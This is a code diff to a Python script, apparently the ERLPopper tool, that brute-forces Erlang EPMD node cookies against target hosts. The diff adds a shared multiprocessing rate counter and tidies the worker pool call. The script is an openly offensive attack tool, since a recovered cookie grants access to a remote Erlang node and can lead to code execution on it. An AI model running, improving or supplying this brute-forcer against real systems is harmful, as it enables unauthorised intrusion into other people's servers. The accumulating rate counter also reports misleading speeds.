@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import argparse
+import multiprocessing
 from os.path import isfile
 from time import time
 from multiprocessing import Pool
@@ -39,8 +40,11 @@ def go(target, interval, version, verbose):
     interval_time_last = time()
     interval_progress = int(start)
     for i in range(int(start), int(end)):
-        if time() - interval_time_last > 5:
-            print(f"Cookies: {int((i-interval_progress)/5)}/s", end='\r')
+        if time() - interval_time_last > 2:
+            r = int((i-interval_progress)/2)
+            with rate.get_lock():
+                rate.value += r
+            print(f"Cookies: {rate.value}/s", end='\r')
             interval_progress = i
             interval_time_last = time()
         cookie = ERLPopper.create_cookie_from_seed(i)
@@ -49,11 +53,6 @@ def go(target, interval, version, verbose):
             return (target, cookie)
 
 if __name__ == "__main__":
-    # [TODO] implement multithreading
-    #          One technique could be to divide up the loaded intervals evenly
-    #          among the maximum number of workers. This is what multiprocessing.pool
-    #          can be used for, I think.
-
     # Parse args
     parser = argparse.ArgumentParser(
             description="Attempt to brute force EPMD node cookie using various methods.",
@@ -74,9 +73,9 @@ if __name__ == "__main__":
     if args.new:
         version = 6
 
+    rate = multiprocessing.Value('I')
+    
     targets_intervals_product = product(args.target, args.interval, [version], [args.verbose])
 
     with Pool(processes=args.processes) as pool:
-        result = pool.starmap_async(func=go, iterable=targets_intervals_product, callback=print_result)
-
-        result.get()
+        result = pool.starmap_async(func=go, iterable=targets_intervals_product, callback=print_result).get()
